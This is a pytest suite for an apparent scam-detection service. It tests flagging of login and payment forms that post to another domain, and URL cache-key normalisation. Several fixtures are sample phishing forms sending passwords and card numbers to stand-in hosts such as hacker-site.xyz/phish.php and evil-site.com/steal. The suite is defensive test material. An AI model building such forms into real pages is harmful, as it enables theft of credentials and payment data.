"""
Targeted Adversarial Validation Test Suite for Addition 1 (Form Action Inspection)
and Addition 2 (Path-Aware Cache Key Normalization).
"""
import pytest
from app.services.content_extractor import ContentExtractor
from app.analyzers.content_analyzer import ContentAnalyzer
from app.schemas.content_analysis import ContentScamCategory, ExtractedWebsiteEvidence
from app.services.rule_based_trust_engine import RuleBasedTrustEngine
from app.schemas.ssl_analysis import SSLAnalysisResult
from app.schemas.whois_analysis import WHOISAnalysisResult
from app.schemas.header_analysis import HeaderAnalysisResult
from app.schemas.redirect_analysis import RedirectAnalysisResult


# ==============================================================================
# ADDITION 1 — FORM ACTION ADVERSARIAL TESTS
# ==============================================================================

def test_add1_1_same_origin_login_form():
    """1. same-origin login form → no cross-domain signal"""
    html = """
    <html><body>
      <form action="/login" method="POST">
        <input type="text" name="username" />
        <input type="password" name="password" />
        <button type="submit">Log In</button>
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://myshop.com/auth/login")
    assert evidence.has_cross_domain_sensitive_form is False


def test_add1_2_same_origin_payment_form():
    """2. same-origin payment form → no cross-domain signal"""
    html = """
    <html><body>
      <form action="https://myshop.com/checkout/pay" method="POST">
        <input type="text" name="card_number" />
        <input type="text" name="cvv" />
        <button type="submit">Pay Now</button>
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://myshop.com/checkout")
    assert evidence.has_cross_domain_sensitive_form is False


def test_add1_3_legitimate_external_auth_payment_origin():
    """3. legitimate external payment/authentication origin → does not automatically become a scam signal"""
    # Google OAuth form target
    html_google = """
    <html><body>
      <form action="https://accounts.google.com/o/oauth2/v2/auth" method="POST">
        <input type="email" name="identifier" />
        <button type="submit">Sign in with Google</button>
      </form>
    </body></html>
    """
    ev_google = ContentExtractor.extract(html_google, "https://my-app.com/login")
    assert ev_google.has_cross_domain_sensitive_form is False

    # PayPal checkout form target
    html_paypal = """
    <html><body>
      <form action="https://www.paypal.com/cgi-bin/webscr" method="POST">
        <input type="hidden" name="cmd" value="_xclick" />
        <button type="submit">Pay with PayPal</button>
      </form>
    </body></html>
    """
    ev_paypal = ContentExtractor.extract(html_paypal, "https://my-store.com/cart")
    assert ev_paypal.has_cross_domain_sensitive_form is False

    # Stripe checkout form target
    html_stripe = """
    <html><body>
      <form action="https://checkout.stripe.com/c/pay" method="POST">
        <input type="text" name="card" />
        <button type="submit">Pay Now</button>
      </form>
    </body></html>
    """
    ev_stripe = ContentExtractor.extract(html_stripe, "https://my-store.com/cart")
    assert ev_stripe.has_cross_domain_sensitive_form is False


def test_add1_4_unrelated_external_credential_destination():
    """4. unrelated external credential destination → CREDENTIAL_HARVESTING"""
    html = """
    <html><body>
      <form action="http://hacker-site.xyz/phish.php" method="POST">
        <input type="text" name="email" />
        <input type="password" name="password" />
        <button type="submit">Sign In</button>
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://bank-replica.com/login")
    assert evidence.has_cross_domain_sensitive_form is True
    
    analyzer = ContentAnalyzer()
    res = analyzer.analyze(evidence)
    assert res.content_risk_score >= 50
    harv_signals = [s for s in res.signals if s.category == ContentScamCategory.CREDENTIAL_HARVESTING and s.severity == "CRITICAL"]
    assert len(harv_signals) > 0


def test_add1_5_unrelated_external_payment_destination():
    """5. unrelated external payment destination → appropriate warning"""
    html = """
    <html><body>
      <form action="http://unknown-receiver.biz/steal_card.php" method="POST">
        <input type="text" name="card_number" />
        <input type="text" name="cvv" />
        <button type="submit">Buy Now</button>
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://scam-store.com/checkout")
    assert evidence.has_cross_domain_sensitive_form is True

    analyzer = ContentAnalyzer()
    res = analyzer.analyze(evidence)
    assert res.content_risk_score >= 50
    assert len(res.signals) > 0


def test_add1_6_relative_form_action():
    """6. relative form action → correctly resolves against page origin"""
    html = """
    <html><body>
      <form action="../auth/verify" method="POST">
        <input type="password" name="pin" />
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://secure-bank.com/user/settings")
    assert evidence.has_cross_domain_sensitive_form is False
    assert len(evidence.form_action_targets) > 0
    assert "https://secure-bank.com/auth/verify" in evidence.form_action_targets[0]


def test_add1_7_absolute_same_origin_form_action():
    """7. absolute same-origin form action → correctly treated as same-origin"""
    html = """
    <html><body>
      <form action="https://secure-bank.com/login/process" method="POST">
        <input type="password" name="pass" />
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://secure-bank.com/login")
    assert evidence.has_cross_domain_sensitive_form is False


def test_add1_8_protocol_relative_action():
    """8. protocol-relative action → correctly resolved"""
    html = """
    <html><body>
      <form action="//secure-bank.com/login/submit" method="POST">
        <input type="password" name="pass" />
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://secure-bank.com/login")
    assert evidence.has_cross_domain_sensitive_form is False

    # External protocol-relative
    html_ext = """
    <html><body>
      <form action="//evil-site.com/steal" method="POST">
        <input type="password" name="pass" />
      </form>
    </body></html>
    """
    ev_ext = ContentExtractor.extract(html_ext, "https://secure-bank.com/login")
    assert ev_ext.has_cross_domain_sensitive_form is True


def test_add1_9_missing_action():
    """9. missing action → handled safely"""
    html = """
    <html><body>
      <form method="POST">
        <input type="password" name="pass" />
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://myshop.com/login")
    assert evidence.has_cross_domain_sensitive_form is False


def test_add1_10_malformed_action():
    """10. malformed action → handled safely"""
    html = """
    <html><body>
      <form action="javascript:void(0);" method="POST">
        <input type="password" name="pass" />
      </form>
      <form action="ht!!tp://invalid URL space" method="POST">
        <input type="password" name="pass" />
      </form>
    </body></html>
    """
    evidence = ContentExtractor.extract(html, "https://myshop.com/login")
    assert evidence.has_cross_domain_sensitive_form is False


def test_add1_11_rule_based_trust_engine_immutability():
    """11. Verify new signal does not bypass existing deterministic architecture or modify RuleBasedTrustEngine"""
    engine = RuleBasedTrustEngine()
    ssl = SSLAnalysisResult(is_valid=True)
    whois = WHOISAnalysisResult(is_registered=True, domain_age_days=500)
    header = HeaderAnalysisResult(
        strict_transport_security=True,
        content_security_policy=True,
        x_frame_options=True,
        x_content_type_options=True,
        referrer_policy=True,
        permissions_policy=True,
        security_headers_score=6
    )
    redirect = RedirectAnalysisResult(
        redirect_count=0,
        redirected=False,
        same_domain=True,
        https_upgrade=True,
        cross_domain_redirect=False,
        is_safe_redirect=True
    )
    
    score = engine.evaluate(ssl, whois, header, redirect)
    assert score.trust_score > 0
    # RuleBasedTrustEngine evaluation is 100% untouched


# ==============================================================================
# ADDITION 2 — CACHE GRANULARITY & NORMALIZATION TESTS
# ==============================================================================

def normalize_url_key_python_reference(url_or_domain: str) -> str:
    """Python reference implementation matching extension normalizeUrlKey logic"""
    from urllib.parse import urlparse
    if not url_or_domain:
        return ""
    try:
        raw = url_or_domain.lower().strip()
        parsed = urlparse(raw if raw.startswith("http://") or raw.startswith("https://") else f"http://{raw}")
        domain = parsed.hostname.replace("www.", "").lower()
        pathname = parsed.path.rstrip("/").lower()
        return f"{domain}{pathname}" if pathname and pathname != "/" else domain
    except Exception:
        return url_or_domain.replace("www.", "").lower()


def test_add2_1_root_path_and_deep_path_have_separate_identities():
    """1. root path and deep path have separate cache identities"""
    key_root = normalize_url_key_python_reference("https://example.com/")
    key_deep = normalize_url_key_python_reference("https://example.com/checkout/pay")
    assert key_root == "example.com"
    assert key_deep == "example.com/checkout/pay"
    assert key_root != key_deep


def test_add2_2_different_paths_cannot_overwrite_each_other():
    """2. different paths cannot overwrite each other"""
    key1 = normalize_url_key_python_reference("https://example.com/login")
    key2 = normalize_url_key_python_reference("https://example.com/products")
    assert key1 != key2


def test_add2_3_query_parameters_do_not_cause_cache_explosion():
    """3. query parameters do not cause uncontrolled cache explosion"""
    key_base = normalize_url_key_python_reference("https://example.com/item")
    key_q1 = normalize_url_key_python_reference("https://example.com/item?id=123&ref=abc")
    key_q2 = normalize_url_key_python_reference("https://example.com/item?id=456&session=xyz")
    assert key_base == "example.com/item"
    assert key_q1 == key_base
    assert key_q2 == key_base


def test_add2_4_fragments_handled_deterministically():
    """4. fragments are handled deterministically"""
    key_base = normalize_url_key_python_reference("https://example.com/about")
    key_frag = normalize_url_key_python_reference("https://example.com/about#team-section")
    assert key_frag == key_base


def test_add2_5_url_normalization_is_deterministic():
    """5. URL normalization is deterministic"""
    key1 = normalize_url_key_python_reference("HTTPS://WWW.Example.COM/Checkout/")
    key2 = normalize_url_key_python_reference("http://example.com/checkout")
    assert key1 == "example.com/checkout"
    assert key2 == "example.com/checkout"
    assert key1 == key2
